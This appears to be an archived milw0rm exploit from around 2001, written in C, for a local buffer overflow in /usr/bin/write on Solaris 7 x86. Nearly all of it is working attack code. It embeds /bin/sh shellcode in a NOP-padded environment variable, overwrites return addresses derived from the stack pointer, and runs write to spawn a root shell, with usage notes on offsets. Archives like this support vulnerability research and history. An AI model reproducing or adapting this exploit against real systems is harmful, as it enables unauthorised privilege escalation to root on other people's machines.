#include <stdio.h>
#include <unistd.h>
/*

  /usr/bin/write overflow proof of conecpt.

  Tested on Solaris 7 x86

  Pablo Sor, Buenos Aires, Argentina. 01/2000
  psor@afip.gov.ar

  usage: write-exp [shell_offset] [ret_addr_offset]

  default offset should work.

*/
long get_esp() { __asm__("movl %esp,%eax"); }

char shell[] =
  "\xeb\x45\x9a\xff\xff\xff\xff\x07\xff"
  "\xc3\x5e\x31\xc0\x89\x46\xb7\x88\x46"
  "\xbc\x88\x46\x07\x89\x46\x0c\x31\xc0"
  "\xb0\x2f\xe8\xe0\xff\xff\xff\x52\x52"
  "\x31\xc0\xb0\xcb\xe8\xd5\xff\xff\xff"
  "\x83\xc4\x08\x31\xc0\x50\x8d\x5e\x08"
  "\x53\x8d\x1e\x89\x5e\x08\x53\xb0\x3b"
  "\xe8\xbe\xff\xff\xff\x83\xc4\x0c\xe8"
  "\xbe\xff\xff\xff\x2f\x62\x69\x6e\x2f"
  "\x73\x68\xff\xff\xff\xff\xff\xff\xff"
  "\xff\xff";

  /* shellcode by Cheez Whiz */

void main(int argc,char **argv)
{
  FILE *fp;
  long magic,magicret;
  char buf[100],*envi;
  int i;

  envi = (char *) malloc(1000*sizeof(char));
  memset(envi,0x90,1000);
  memcpy(envi,"SOR=",4);
  memcpy(envi+980-strlen(shell),shell,strlen(shell));
  envi[1000]=0;
  putenv(envi);

  if (argc!=3)
  {
    magicret = get_esp()+116;
    magic = get_esp()-1668;
  }
  else
  {
    magicret = get_esp()+atoi(argv[1]);
    magic = get_esp()+atoi(argv[2]);
  }

  memset(buf,0x41,100);
  buf[99]=0;
  memcpy(buf+91,&magic,4);
  for(i=0;i<22;++i) memcpy(buf+(i*4),&magicret,4);
  execl("/usr/bin/write","write","root",buf,(char *)0);
}


// milw0rm.com [2001-01-25]